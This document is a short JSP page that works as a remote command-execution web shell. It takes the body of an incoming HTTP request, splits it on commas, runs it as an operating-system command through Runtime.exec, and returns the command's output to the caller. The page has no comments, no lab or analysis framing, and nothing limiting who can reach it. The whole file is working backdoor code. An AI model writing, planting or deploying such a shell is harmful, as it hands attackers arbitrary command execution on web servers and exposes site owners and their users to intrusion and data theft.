<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="java.io.*" %>　　
<% request.setCharacterEncoding("UTF-8"); %>
<%
    try {
        BufferedReader br = request.getReader();
        String str, wholeStr = "";
        while((str = br.readLine()) != null) {
            wholeStr += str + "\n";
        }
		br.close();
		
        if(wholeStr != null && !wholeStr.trim().equals("")){
			wholeStr = wholeStr.substring(0,wholeStr.length()-1);
			InputStream in = Runtime.getRuntime().exec(wholeStr.split(",",3)).getInputStream();
			ByteArrayOutputStream baos = new ByteArrayOutputStream();
			byte[] buffer = new byte[1024];
			int len = 0;
			while((len = in.read(buffer)) != -1) {
				baos.write(buffer, 0, len);
			}
			response.getWriter().print(baos.toString().trim());
			out.clearBuffer();
			in.close();
			baos.close();
		}
    } catch (IOException e) {
        System.err.println(e);
    }
%>
